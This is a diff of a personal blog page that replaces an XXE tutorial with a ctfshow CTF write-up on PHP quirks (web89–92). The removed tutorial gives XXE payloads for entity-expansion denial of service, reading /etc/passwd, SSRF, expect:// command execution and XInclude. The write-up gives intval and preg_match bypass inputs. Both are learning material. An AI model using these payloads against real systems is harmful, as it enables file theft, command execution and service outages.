@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>xxe漏洞学习 | 大周&#39;blog</title>
+  <title>ctfshow-web入门PHP特性 | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -272,11 +272,11 @@
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
     <div class="pattern-attachment-img">
-        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200811110729.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210122215046.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
       </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      xxe漏洞学习</h1>
+      ctfshow-web入门PHP特性</h1>
       <p class="entry-census">
         <span>
           <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
@@ -288,7 +288,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-8-11
+        2021-1-22
         
       
         ·<span id="readcount"></span>次阅读
@@ -305,38 +305,150 @@
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>前几天ctfshow的webak赛有一道利用xxe漏洞的题，当时看一些xxe的资料也没整出来，想着再学习下。</p>
-<a id="more"></a>
+          <h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><pre><code>&lt;?php
 
-<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
-<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>
-<h4 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code></pre><h4 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h4><p>1.内部DTD文档</p>
-<pre><code>&lt;!DOCTYPE 根元素[定义内容]&gt;</code></pre><p>2.外部DTD文档</p>
-<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></pre><p>3.内外部DTD文档结合</p>
-<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></pre><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><pre><code>&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY a0 &quot;dos&quot; &gt;
-&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
-&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data [
-&lt;!ELEMENT data (#ANY)&gt;
-&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-]&gt;
-&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
-&lt;!ELEMENT data (#ANY)&gt;
-]&gt;
-&lt;data&gt;4&lt;/data&gt;</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
-&lt;catalog&gt;
-   &lt;core id=&quot;test101&quot;&gt;
-      &lt;description&gt;&amp;xxe;&lt;/description&gt;
-   &lt;/core&gt;
-&lt;/catalog&gt;</code></pre><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
-&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 15:38:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+
+if(isset($_GET[&#39;num&#39;])){
+    $num = $_GET[&#39;num&#39;];
+    if(preg_match(&quot;/[0-9]/&quot;, $num)){
+        die(&quot;no no no!&quot;);
+    }
+    if(intval($num)){
+        echo $flag;
+    }
+}</code></pre><p>get方式传入num参数，然后通过preg_match判断是否存在数字，如果存在，就die，不存在的话然后intval函数判断整数，通过数组绕过preg_match，因为preg_match无法处理数组，所以payload：</p>
+<p><code>?num[]=1</code></p>
+<h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:06:11
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;])){
+    $num = $_GET[&#39;num&#39;];
+    if($num===&quot;4476&quot;){
+        die(&quot;no no no!&quot;);
+    }
+    if(intval($num,0)===4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+}</code></pre><p>get方式传入num，如果num===4476就die，然后intval判断num，这里看intval函数</p>
+<pre><code>intval
+(PHP 4, PHP 5, PHP 7)
+intval — 获取变量的整数值
+说明
+int intval( mixed $var[, int $base = 10] )
+通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。 
+
+参数
+var
+要转换成 integer 的数量值 
+base
+转化所使用的进制 
+
+Note: 
+如果 base 是 0，通过检测 var 的格式来决定使用的进制： 
+• 如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，  
+• 如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，  
+• 将使用 10 进制 (decimal)。</code></pre><p>所以intval是支持不同的进制的，这里base指定是0，那么intval会根据我们输入情况使用进制，</p>
+<p>所以这里我就就可以用16进制或八进制表示4476</p>
+<pre><code>?num=0×117c    //十六进制
+?num=010574    //八进制</code></pre><p>还有看下边的例子</p>
+<pre><code>&lt;?php 
+echo intval(&#39;a123&#39;);
+echo &#39;-&#39;;
+echo intval(123);
+echo &#39;-&#39;;
+echo intval(&#39;123a&#39;);
+?&gt;
+//0-123-123</code></pre><p>intval取的是我们所输入内容开头的整数，也就是说我们传入含有字符的字符串，例如<code>?num=4476a</code>,那么intval(“4476a”)也等于4476</p>
+<p>所以payload</p>
+<pre><code>?num=0x117c    //十六进制
+?num=010574    //八进制
+?num=4476a    //字符串</code></pre><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:16:09
+# @link: https://ctfer.com
+
+*/
+
+show_source(__FILE__);
+include(&#39;flag.php&#39;);
+$a=$_GET[&#39;cmd&#39;];
+if(preg_match(&#39;/^php$/im&#39;, $a)){
+    if(preg_match(&#39;/^php$/i&#39;, $a)){
+        echo &#39;hacker&#39;;
+    }
+    else{
+        echo $flag;
+    }
+}
+else{
+    echo &#39;nonononono&#39;;
+}
+</code></pre><p>看两个preg_match的差别</p>
+<p>第一个preg_match(‘/^php$/im’, $a)</p>
+<p>第二个preg_match(‘/^php$/i’, $a)</p>
+<p>差别就在于第一个preg_match多了个/m,/m表示匹配多行数据，就是输入的每一行都被匹配，所以我们可以通过换行(%0a)绕过，最终payload<code>?cmd=1%0aphp</code></p>
+<h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><pre><code>&lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-18 16:29:30
+# @link: https://ctfer.com
+
+*/
+
+include(&quot;flag.php&quot;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;num&#39;])){
+    $num = $_GET[&#39;num&#39;];
+    if($num==4476){
+        die(&quot;no no no!&quot;);
+    }
+    if(intval($num,0)==4476){
+        echo $flag;
+    }else{
+        echo intval($num,0);
+    }
+}</code></pre><p>首先要求num!=4476,然后intval($num,0)==4476</p>
+<p>八进制和十六进制还是可行的</p>
+<pre><code>?num=0x117c    //十六进制
+?num=010574    //八进制</code></pre>
         </div>
         <!-- .entry-content -->
         
@@ -357,39 +469,20 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/005WQYV9gy1fqdf874afuj31hc0u0qis.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/005WQYV9gy1fqdf874afuj31hc0u0qis.jpg">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/005WQYV9gy1fqdf874afuj31hc0u0qis.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                ctfshow-web入门信息搜集</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/08/08/%E7%99%BD%E5%AB%96%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%9F%9F%E5%90%8D/" rel="next">
+            <a href="/2021/01/14/ctfshow-web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200808160923.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20210114230320.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                白嫖腾讯云服务器和域名</h3>
+                ctfshow-web入门文件包含</h3>
                 <hr>
               </div>
             </a>
